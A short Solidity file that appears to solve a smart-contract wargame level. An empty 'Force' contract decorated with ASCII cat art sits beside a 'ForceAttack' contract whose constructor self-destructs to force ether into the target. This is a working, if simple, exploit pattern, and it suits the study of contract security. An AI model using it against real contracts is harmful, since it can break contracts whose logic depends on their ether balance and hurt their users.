// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Send it funds with self destruct.
contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceAttack {
    constructor(address _force) payable {
        selfdestruct(payable(_force));
    }
}
